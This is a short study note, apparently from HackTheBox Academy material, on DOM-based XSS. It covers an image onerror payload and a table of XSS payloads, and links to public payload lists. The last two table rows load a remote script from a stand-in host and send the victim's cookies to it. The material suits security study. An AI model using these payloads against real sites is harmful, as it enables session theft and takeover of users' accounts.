## DOM Attacks

The `innerHTML` does not allow `<script>` tag because of security issues so we need to use a different approach for DOM XSS exploitation.

```html
<img src="" onerror=alert(document.cookie)>
```

Here basically if the `<img>` tag fails to load the external file, then `<onerror>` tag will execute the JavaScript code present within `""`.  The above payload shows the **cookie** value.

### XSS Payloads

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md

https://github.com/payloadbox/xss-payload-list

Below are some demos....

|Code|Description|
|---|---|
|**XSS Payloads**||
|`<script>alert(window.origin)</script>`|Basic XSS Payload|
|`<plaintext>`|Basic XSS Payload|
|`<script>print()</script>`|Basic XSS Payload|
|`<img src="" onerror=alert(window.origin)>`|HTML-based XSS Payload|
|`<script>document.body.style.background = "#141d2b"</script>`|Change Background Color|
|`<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>`|Change Background Image|
|`<script>document.title = 'HackTheBox Academy'</script>`|Change Website Title|
|`<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`|Overwrite website's main body|
|`<script>document.getElementById('urlform').remove();</script>`|Remove certain HTML element|
|`<script src="http://OUR_IP/script.js"></script>`|Load remote script|
|`<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`|Send Cookie details to us|